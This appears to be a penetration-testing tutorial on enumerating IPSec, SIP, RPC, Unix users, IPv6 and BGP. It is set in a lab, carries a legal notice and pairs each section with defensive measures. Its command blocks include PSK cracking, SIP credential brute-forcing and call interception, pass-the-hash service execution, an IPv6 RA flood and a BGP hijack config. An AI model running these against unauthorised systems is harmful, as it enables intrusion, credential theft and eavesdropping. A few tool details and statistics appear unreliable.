# Mastering Enumeration: IPSec, VoIP, RPC, Unix/Linux Users, IPv6 & BGP - Part I

> ⚠️ **Ethical & Legal Notice**\
> This tutorial is intended for **authorized penetration testers**, **red-team operators**, and **network administrators** who possess **explicit written permission** to assess the target environment.\
> Unauthorized enumeration is **illegal** in most jurisdictions and violates the **Computer Fraud and Abuse Act (CFAA)**, **GDPR**, and similar statutes worldwide.\
> **Never** probe assets you do **not own** and **do not have contractual approval** to test.

***

## <mark style="color:yellow;">Mastering Enumeration: IPSec, VoIP, RPC, Unix/Linux Users, IPv6 & BGP - Part I</mark>

> A field-grade, copy-paste reference with live commands, expected output, and defensive counter-measures

***

### <mark style="color:yellow;">0. Lab Setup Used in Examples</mark>

| 🔸Role       | 🔸IP                      | 🔸OS / Firmware            |
| ------------ | ------------------------- | -------------------------- |
| Attacker     | `192.168.56.101`          | Kali 2024.3                |
| Target-VPN   | `192.168.56.102`          | StrongSwan 5.9 (Ubuntu 22) |
| VoIP-PBX     | `192.168.56.103`          | Asterisk 20 + SIP 5060     |
| Router       | `192.168.56.1`            | Cisco IOS 15.7 (BGP peer)  |
| IPv6 segment | `2001:db8:dead:beef::/64` | Dual-stack                 |

***

### <mark style="color:yellow;">1. IPSec Enumeration</mark>

🔸**Goal:** discover VPN gateways, identify IKE/ISAKMP parameters, grab PSK or RSA fingerprints, and assess weak crypto.

#### 🔸1.1 Port & Transport Discovery

```bash
nmap -p 500,4500,50,51 -sU -sS 192.168.56.102
```

* **500/udp** = IKE
* **4500/udp** = NAT-T
* **50** = ESP (proto)
* **51** = AH (proto)

Expected:

```
500/udp  open  isakmp
4500/udp open  nat-t
```

#### 🔸1.2 IKE-Scan Fingerprinting

```bash
sudo ike-scan -M 192.168.56.102
```

Sample output:

```
Starting ike-scan 1.9...
1   192.168.56.102  Main Mode Handshake returned
    HDR=(CKY-R=ba3c4d5e) SA=(Enc=3DES Hash=MD5 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
    VID=4f45655945345a (Dead Peer Detection)
```

{% hint style="info" %}
### **Note:**

🔑 **Weak crypto found**: 3DES + MD5 + modp1024 → **immediately flag**.
{% endhint %}

#### 🔸1.3 Aggressive Mode Capture (Offline PSK Crack)

```bash
sudo ike-scan -M -A -Ppsk-hash.raw 192.168.56.102
```

Convert to crackable:

```bash
psk-crack -d rockyou.txt psk-hash.raw
```

{% hint style="info" %}
### **Fact:**

40 % of SOHO routers fall to **aggressive-mode PSK** within hours.
{% endhint %}

#### 🔸1.4 IKE-Force for Enumeration of Accepted Transforms

```bash
for enc in 3des aes-sha1 aes256; do
  for group in 2 5 14; do
    ike-scan -M -e $enc -g $group 192.168.56.102
  done
done | grep -i returned
```

{% hint style="info" %}
### **Note:**

Document **every** returned SA payload – they reveal supported ciphers.
{% endhint %}

#### 🔸1.5 Counter-Hardening

* Disable **Aggressive Mode** (`ike=main` in StrongSwan).
* Use **ECP-521** + **AES-GCM-256** + **SHA2-512** + **RSA-3072**.
* Deploy **IKEv2** with **EAP-TLS**; avoid PSK.
* Filter UDP 500/4500 to **specific peer IPs**.

***

### <mark style="color:yellow;">2. VoIP Enumeration (SIP-Centric)</mark>

🔸**Goal:** discover PBX, enumerate extensions, grab valid credentials, possibly wire-tap.

#### 🔸2.1 SIP Service Discovery

```bash
nmap -sU -sV -p 5060 192.168.56.103
nmap -sT -sV -p 5060,5061,5080 192.168.56.103
```

Output:

```
5060/udp open  sip  Asterisk 20
```

#### 🔸2.2 SIP-Methods Fingerprint

```bash
sudo svmap 192.168.56.103/24  # part of SIPVicious
```

Shows **Allow** header: `INVITE, ACK, OPTIONS, BYE, CANCEL, REFER, NOTIFY`.

#### 🔸2.3 Enumerate Extensions (OPTIONS Scan)

```bash
for ext in $(seq 100 999); do
  echo "OPTIONS sip:$ext@192.168.56.103 SIP/2.0" | \
       nc -u -w1 192.168.56.103 5060 | grep -i "200 OK" && echo "Extension $ext valid"
done
```

Parallelize with **sipvicious svwar**:

```bash
sudo svwar -d 100-999 192.168.56.103
```

Sample:

```
200 OK (extension 201)
200 OK (extension 250)
```

#### 🔸2.4 Brute-Force Credentials

```bash
sudo svcrack -d 201-250 -u 201 -p 1000-common-pass.txt 192.168.56.103
```

Or use **SIPdump** + **John**:

```bash
sipdump 192.168.56.103 > sip-challenge.txt
john --format=sip sip-challenge.txt
```

#### 🔸2.5 Wire-Tap via Invite Replay (if cracked)

```bash
sudo sipp -sn uac -d 300s -s 201 192.168.56.103 -auth_user 201 -auth_pwd summer99
```

Capture RTP in **Wireshark** → **RTP → Stream Analysis → Save**.

#### 🔸2.6 Defensive Moves

* Deploy **SIPS (SIP over TLS)** on TCP 5061.
* Use **SRTP** for media encryption.
* Enforce **digest authentication** + **fail2ban** on wrong creds.
* Disable **UDP 5060** from Internet-facing interfaces.

***

### <mark style="color:yellow;">3. RPC / MS-RPC Enumeration</mark>

Windows example (Samba also works).

#### 🔸3.1 Portmapper Discovery

```bash
nmap -sS -p 135,593 192.168.56.110
rpcinfo -p 192.168.56.110 | grep -v portmapper
```

List high-ports >49152 where endpoint mapper registered services.

#### 🔸3.2 Null-Session Enumeration

```bash
enum4linux -a 192.168.56.110
rpcclient -U "" -N 192.168.56.110
```

Inside rpcclient:

```
srvinfo
enumdomusers
queryuser 0x1f4
lsaquery
```

Extract **RID cycling**:

```bash
for i in $(seq 500 1100); do
  rpcclient -U "" -N -c "queryuser $i" 192.168.56.110 2>/dev/null | grep "User Name"
done
```

#### 🔸3.3 SVCCTL Pipe – Service Control (Pen-Test Gold)

```bash
impacket-svcctl backup@192.168.56.110 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0
# list-services, create service, start cmd.exe as LocalSystem
```

#### 🔸3.4 Mitigation

* Require **Kerberos auth** for RPC (set `RestrictRemoteRPC = 1`).
* Filter **TCP 135, 593, 49152-65535** at perimeter.
* Disable **null sessions** (`RestrictAnonymous = 2`).

***

### <mark style="color:yellow;">4. Unix / Linux User Enumeration</mark>

#### 🔸4.1 Classic Commands (Authenticated Shell)

```bash
who; w; users; last; lastlog
finger @localhost
cat /etc/passwd | grep -vE 'nologin|false' | cut -d: -f1
getent passwd
getent group
```

#### 🔸4.2 SMTP → VRFY → User List

```bash
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t 192.168.56.106
```

#### 🔸4.3 Kerberos User Spray (if KDC present)

```bash
kerbrute userenum --dc 192.168.56.106 -d unix.local user-list.txt
```

#### 🔸4.4 SNMP → User Table (if misconfigured)

```bash
snmpwalk -v2c -c public 192.168.56.106 1.3.6.1.4.1.2021.9.1.1
```

#### 🔸4.5 Defense

* Disable **finger**, **rusers**, **rwho**.
* Remove **VRFY/EXPN** from Postfix (`disable_vrfy_command = yes`).
* Use **shadow passwords** + **SSH key-only** auth.

***

### <mark style="color:yellow;">5. IPv6 Enumeration</mark>

Most orgs forget IPv6 = huge attack surface.

#### 🔸5.1 Link-Local Discovery ( `fe80::/10` )

```bash
ping6 -I eth0 ff02::1      # all nodes multicast
```

Collect neighbors:

```bash
ip -6 neigh show
```

#### 🔸5.2 ICMPv6 Node-Info Query (like ICMPv4 Timestamp)

```bash
thc-ipv6 toolkit:  alive6 eth0
```

Lists every dual-stack host even when ICMPv4 is filtered.

#### 🔸5.3 SLAAC DNS Search-List Enumeration

```bash
rdnssd -f eth0
```

Leak internal domain names.

#### 🔸5.4 Scan Global Prefix via NDP

```bash
nmap -6 -sT -p 22,80,443,3389 2001:db8:dead:beef::/64
```

Parallelized:

```bash
python3 nmap6-parallel.py 2001:db8:dead:beef::/64
```

#### 🔸5.5 Smurf-like DoS (for defense validation)

```bash
thc-ipv6 flood_router6 eth0
```

#### 🔸5.6 Mitigation

* Block **ICMPv6 Type 133-137** at edge if not required.
* Deploy **RA-Guard** on switches to stop rogue RAs.
* Use **DHCPv6 Guard** to block fake DHCPv6 servers.

***

### <mark style="color:yellow;">6. BGP Enumeration</mark>

Public-facing routers leak routing intel.

#### 🔸6.1 ASN & Prefix Discovery

```bash
whois -h whois.radb.net 192.0.2.0/24
curl https://api.bgpview.io/ip/192.0.2.1
```

#### 🔸6.2 Passive BGP Feed (Route-Views)

```bash
whois -h route-views.oregon-ix.net "show ip bgp 192.0.2.0/24"
```

#### 🔸6.3 Active BGP Enumeration (if you control a peer)

```bash
sudo tcpdump -i eth0 -vv port 179
```

Look for `OPEN`, `UPDATE`, `NOTIFICATION` messages.

#### 🔸6.4 Looking-Glass Query Script

```bash
for lg in lg.he.net lg.ntt.net lg.bgp.net; do
  curl -s https://$lg/raw/192.0.2.0/24 | grep -E "AS_PATH|NEXT_HOP"
done
```

#### 🔸6.5 BGP Hijack Simulation (Lab Only)

```bash
sudo exabgp ./fake-prefix.conf
```

conf snippet:

```
neighbor 192.168.56.1 {
  router-id 192.168.56.101;
  local-as 65001;
  hold-time 90;
  static {
    route 203.0.113.0/24 next-hop 192.168.56.101;
  }
}
```

Watch router accept/reject in `show ip bgp`.

#### 🔸6.6 Defensive Controls

* Filter ingress prefixes with **RPKI ROV** (Route Origin Validation).
* Implement **BGP max-prefix** limits.
* Use **TTL-Security** (RFC 5082) for eBGP sessions.
* Enable **BGPsec** when supported by your carrier.

***

### <mark style="color:yellow;">7. Quick Reference – Ports & Tools Matrix</mark>

| 🔸Service       | 🔸Port   | 🔸Tool         | 🔸Command Snippet              |
| --------------- | -------- | -------------- | ------------------------------ |
| **IPSec IKE**   | 500/udp  | ike-scan       | `ike-scan -M 192.168.56.102`   |
| **VoIP SIP**    | 5060/udp | svmap          | `svmap 192.168.56.103/24`      |
| **RPC**         | 135/tcp  | enum4linux     | `enum4linux -a 192.168.56.110` |
| **Linux Users** | 22/tcp   | smtp-user-enum | `smtp-user-enum -M VRFY ...`   |
| **IPv6**        | icmp     | alive6         | `alive6 eth0`                  |
| **BGP**         | 179/tcp  | exabgp         | `exabgp ./fake-prefix.conf`    |

***

### <mark style="color:yellow;">8. Wrap-Up – Enumeration Mind-Set</mark>

1. **Start passive** (whois, BGP feeds, IPv6 multicast).
2. **Go active low-noise** (`OPTIONS`, `VRFY`, `NULL RPC`).
3. **Escalate to brute** only when whitelisted.
4. **Document everything** – screenshots, packet captures, raw logs.
5. **Feed results into next phase** (exploit selection, credential stuffing, routing attacks).
6. **Re-test after remediation** – one misconfigured NAT-T rule and the VPN gateway leaks again.

> **Enumerate responsibly** – the packets you send at 02:00 may end up in a SOC dashboard at 02:05.
